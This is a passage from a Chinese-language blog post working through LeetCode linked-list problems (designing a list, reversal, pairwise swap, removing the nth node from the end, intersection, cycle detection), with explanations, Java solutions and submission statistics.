<p>get(index)：获取链表中第 index 个节点的值。如果索引无效，则返回-1。<br>addAtHead(val)：在链表的第一个元素之前添加一个值为 val 的节点。插入后，新节点将成为链表的第一个节点。<br>addAtTail(val)：将值为 val 的节点追加到链表的最后一个元素。<br>addAtIndex(index,val)：在链表中的第 index 个节点之前添加值为 val  的节点。如果 index 等于链表的长度，则该节点将附加到链表的末尾。如果 index 大于链表长度，则不会插入节点。如果index小于0，则在头部插入节点。<br>deleteAtIndex(index)：如果索引 index 有效，则删除链表中的第 index 个节点。</p>
</blockquote>
<p>下面是单链表的结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//单链表</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode()&#123;&#125;;</span><br><span class="line">    ListNode(<span class="type">int</span> val)&#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="type">int</span> size;<span class="comment">//定义链表大小</span></span><br><span class="line">    ListNode head;<span class="comment">//作为伪头的哨兵节点</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment">//初始化链表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取第index个节点的数值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="comment">//如果index非法，返回-1</span></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">         <span class="comment">//包含一个虚拟头节点，所以查找第 index+1 个节点</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; index+<span class="number">1</span> ;i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        addAtIndex(<span class="number">0</span>,val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        addAtIndex(size,val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//更新链表大小</span></span><br><span class="line">        size++;</span><br><span class="line">        <span class="comment">//找到要插入节点的前驱</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; index;i++)&#123;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//先创建一个节点，值为要增加的val</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        <span class="comment">//将刚创建的节点指向要插入节点（toAdd位于pre和pre.next中间）的下一个节点</span></span><br><span class="line">        toAdd.next = pre.next;</span><br><span class="line">        <span class="comment">//将要pre的指针更新一下</span></span><br><span class="line">        pre.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt;<span class="number">0</span> || index &gt;= size)&#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        size--;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; index;i++)&#123;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pre.next = pre.next.next;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyLinkedList object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyLinkedList obj = new MyLinkedList();</span></span><br><span class="line"><span class="comment"> * int param_1 = obj.get(index);</span></span><br><span class="line"><span class="comment"> * obj.addAtHead(val);</span></span><br><span class="line"><span class="comment"> * obj.addAtTail(val);</span></span><br><span class="line"><span class="comment"> * obj.addAtIndex(index,val);</span></span><br><span class="line"><span class="comment"> * obj.deleteAtIndex(index);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>附上双链表的解法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双链表</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        ListNode next,prev;</span><br><span class="line">        ListNode(<span class="type">int</span> x) &#123;val = x;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head,tail;<span class="comment">//Sentinel node</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Get the value of the index-th node in the linked list. If the index is invalid, return -1. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;<span class="keyword">return</span> -<span class="number">1</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过判断 index &lt; (size - 1) / 2 来决定是从头结点还是尾节点遍历，提高效率</span></span><br><span class="line">        <span class="keyword">if</span>(index &lt; (size - <span class="number">1</span>) / <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">                cur = cur.next;</span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            cur = tail;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= size - index - <span class="number">1</span>; i++)&#123;</span><br><span class="line">                cur = cur.prev;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Add a node of value val before the first element of the linked list. After the insertion, the new node will be the first node of the linked list. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = cur.next;</span><br><span class="line">        cur.next.prev = newNode;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        newNode.prev = cur;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Append a node of value val to the last element of the linked list. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> tail;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = tail;</span><br><span class="line">        newNode.prev = cur.prev;</span><br><span class="line">        cur.prev.next = newNode;</span><br><span class="line">        cur.prev = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Add a node of value val before the index-th node in the linked list. If index equals to the length of linked list, the node will be appended to the end of linked list. If index is greater than the length, the node will not be inserted. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;index = <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = cur.next;</span><br><span class="line">        cur.next.prev = newNode;</span><br><span class="line">        newNode.prev = cur;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Delete the index-th node in the linked list, if the index is valid. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt;= size || index &lt; <span class="number">0</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur.next.next.prev = cur;</span><br><span class="line">        cur.next = cur.next.next;</span><br><span class="line">        size--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206. 反转链表"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list/">206. 反转链表</a></h2><blockquote>
<p>给你单链表的头节点 <code>head</code> ，请你反转链表，并返回反转后的链表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [1,2,3,4,5]</span><br><span class="line">输出：[5,4,3,2,1]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路：遍历"><a href="#思路：遍历" class="headerlink" title="思路：遍历"></a>思路：遍历</h3><p>在遍历链表时，将当前节点的next 指针改为指向前一个节点。由于节点没有引用其前一个节点，因此必须事先存储其前一个节点。在更改引用之前，还需要存储后一个节点。最后返回新的头引用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span> ;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">curr</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(curr != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> curr.next;</span><br><span class="line">            curr.next = prev;</span><br><span class="line">            prev = curr;</span><br><span class="line">            curr = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：0 ms, 在所有 Java 提交中击败了100.00%的用户，O（n）</li>
<li>内存消耗：41.3 MB, 在所有 Java 提交中击败了25.54%的用户，O（1）</li>
<li>通过测试用例：28 &#x2F; 28</li>
</ul>
<h2 id="24-两两交换链表中的节点"><a href="#24-两两交换链表中的节点" class="headerlink" title="24.两两交换链表中的节点"></a><a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/">24.两两交换链表中的节点</a></h2><blockquote>
<p>给你一个链表，两两交换其中相邻的节点，并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题（即，只能进行节点交换）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [1,2,3,4]</span><br><span class="line">输出：[2,1,4,3]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路：迭代"><a href="#思路：迭代" class="headerlink" title="思路：迭代"></a>思路：迭代</h3><p>创建虚拟结点 dummyHead，令 dummyHead.next &#x3D; head。令 temp 表示当前到达的节点，初始时 temp &#x3D; dummyHead。每次需要交换 temp 后面的两个节点。</p>
<p>如果 temp 的后面没有节点或者只有一个节点，则没有更多的节点需要交换，因此结束交换。</p>
<p>否则，获得 temp 后面的两个节点 node1 和 node2，通过更新节点的指针关系实现两两交换节点。具体而言，交换之前的节点关系是 temp -&gt; node1 -&gt; node2，交换之后的节点关系要变成 temp -&gt; node2 -&gt; node1，因此需要进行如下操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(temp.next != <span class="literal">null</span> &amp;&amp; temp.next.next != <span class="literal">null</span>)&#123;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">temp.next = node2</span><br><span class="line">node1.next = node2.next</span><br><span class="line">node2.next = node1</span><br></pre></td></tr></table></figure>

<p>完成上述操作之后，节点关系即变成 temp -&gt; node2 -&gt; node1。再令 temp &#x3D; node1，对链表中的其余节点进行两两交换，直到全部节点都被两两交换。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyNode.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> dummyNode;</span><br><span class="line">        <span class="keyword">while</span>(temp.next != <span class="literal">null</span> &amp;&amp; temp.next.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node1</span> <span class="operator">=</span> temp.next;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node2</span> <span class="operator">=</span> temp.next.next;</span><br><span class="line">            temp.next = node2;</span><br><span class="line">            node1.next = node2.next;</span><br><span class="line">            node2.next = node1;</span><br><span class="line">            temp = node1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：0 ms, 在所有 Java 提交中击败了100.00%的用户，O（n）</li>
<li>内存消耗：39.3 MB, 在所有 Java 提交中击败了8.63%的用户，O（1）</li>
<li>通过测试用例：55 &#x2F; 55</li>
</ul>
<h2 id="19-删除链表的倒数第-N-个结点"><a href="#19-删除链表的倒数第-N-个结点" class="headerlink" title="19. 删除链表的倒数第 N 个结点"></a><a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/">19. 删除链表的倒数第 N 个结点</a></h2><blockquote>
<p>给你一个链表，删除链表的倒数第 <code>n</code> 个结点，并且返回链表的头结点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [1,2,3,4,5], n = 2</span><br><span class="line">输出：[1,2,3,5]</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路1：遍历"><a href="#思路1：遍历" class="headerlink" title="思路1：遍历"></a>思路1：遍历</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> getLength(head);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">curr</span> <span class="operator">=</span> dummyNode;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span> ;i &lt; length-n+<span class="number">1</span>;++i)&#123;</span><br><span class="line">            curr = curr.next;</span><br><span class="line">        &#125;</span><br><span class="line">        curr.next = curr.next.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">ans</span> <span class="operator">=</span> dummyNode.next;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLength</span><span class="params">(ListNode head)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(head != <span class="literal">null</span>)&#123;</span><br><span class="line">            ++length;</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：0 ms, 在所有 Java 提交中击败了100.00%的用户</li>
<li>内存消耗：39.2 MB, 在所有 Java 提交中击败了91.97%的用户</li>
<li>通过测试用例：208 &#x2F; 208</li>
</ul>
<h3 id="思路2：快慢指针"><a href="#思路2：快慢指针" class="headerlink" title="思路2：快慢指针"></a>思路2：快慢指针</h3><p>由于我们需要找到倒数第 n 个节点，因此我们可以使用两个指针 first 和second 同时对链表进行遍历，并且 first 比second 超前 n 个节点。当 first 遍历到链表的末尾时，second 就恰好处于倒数第 n 个节点。</p>
<p>具体地，初始时first 和 second 均指向头节点。我们首先使用 first 对链表进行遍历，遍历的次数为 n。此时，first 和 second 之间间隔了 n−1 个节点，即 first 比 second 超前了 n 个节点。</p>
<p>在这之后，我们同时使用first 和second 对链表进行遍历。当 first 遍历到链表的末尾（即first 为空指针）时，second 恰好指向倒数第 n 个节点。</p>
<p>根据方法一和方法二，如果我们能够得到的是倒数第 n 个节点的前驱节点而不是倒数第 n 个节点的话，删除操作会更加方便。因此我们可以考虑在初始时将 second 指向哑节点，其余的操作步骤不变。这样一来，当 first 遍历到链表的末尾时，second 的下一个节点就是我们需要删除的节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">first</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">second</span>  <span class="operator">=</span> dummyNode;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; n ;i++)&#123;</span><br><span class="line">            first = first.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(first != <span class="literal">null</span>)&#123;</span><br><span class="line">            first = first.next;</span><br><span class="line">            second = second.next;</span><br><span class="line">        &#125;</span><br><span class="line">        second.next = second.next.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">ans</span> <span class="operator">=</span> dummyNode.next;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：0 ms, 在所有 Java 提交中击败了100.00%的用户</li>
<li>内存消耗：39.8 MB, 在所有 Java 提交中击败了12.12%的用户</li>
<li>通过测试用例：208 &#x2F; 208</li>
</ul>
<h2 id="面试题-02-07-链表相交"><a href="#面试题-02-07-链表相交" class="headerlink" title="面试题 02.07. 链表相交"></a><a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists-lcci/">面试题 02.07. 链表相交</a></h2><p>给你两个单链表的头节点 headA 和 headB ，请你找出并返回两个单链表相交的起始节点。如果两个链表没有交点，返回 null 。</p>
<h3 id="思路1：哈希集合"><a href="#思路1：哈希集合" class="headerlink" title="思路1：哈希集合"></a>思路1：哈希集合</h3><p>判断两个链表是否相交，可以使用哈希集合存储链表节点。</p>
<p>首先遍历链表headA，并将链表 headA 中的每个节点加入哈希集合中。然后遍历链表headB，对于遍历到的每个节点，判断该节点是否在哈希集合中：</p>
<p>如果当前节点不在哈希集合中，则继续遍历下一个节点；</p>
<p>如果当前节点在哈希集合中，则后面的节点都在哈希集合中，即从当前节点开始的所有节点都在两个链表的相交部分，因此在链表 headB 中遍历到的第一个在哈希集合中的节点就是两个链表相交的节点，返回该节点。</p>
<p>如果链表 headB 中的所有节点都不在哈希集合中，则两个链表不相交，返回 null。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123;</span></span><br><span class="line"><span class="comment"> *         val = x;</span></span><br><span class="line"><span class="comment"> *         next = null;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">        Set&lt;ListNode&gt; list = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;ListNode&gt;();</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> headA;</span><br><span class="line">        <span class="keyword">while</span>(temp != <span class="literal">null</span>)&#123;</span><br><span class="line">            list.add(temp);</span><br><span class="line">            temp = temp.next;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = headB;</span><br><span class="line">        <span class="keyword">while</span>(temp != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(list.contains(temp))&#123;</span><br><span class="line">                <span class="keyword">return</span> temp;</span><br><span class="line">            &#125;</span><br><span class="line">            temp = temp.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="142-环形链表-II"><a href="#142-环形链表-II" class="headerlink" title="142. 环形链表 II"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">142. 环形链表 II</a></h2><blockquote>
<p>给定一个链表的头节点  head ，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。</p>
<p>如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。如果 pos 是 -1，则在该链表中没有环。注意：pos 不作为参数进行传递，仅仅是为了标识链表的实际情况。</p>
<p>不允许修改 链表。</p>
</blockquote>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [1,2], pos = 0</span><br><span class="line">输出：返回索引为 0 的链表节点</span><br><span class="line">解释：链表中有一个环，其尾部连接到第一个节点。</span><br></pre></td></tr></table></figure>

<h3 id="思路：快慢指针"><a href="#思路：快慢指针" class="headerlink" title="思路：快慢指针"></a>思路：快慢指针</h3><p>思路详解参见：<a href="https://programmercarl.com/0142.%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8II.html#%E6%80%9D%E8%B7%AF">代码随想录 (programmercarl.com)</a></p>
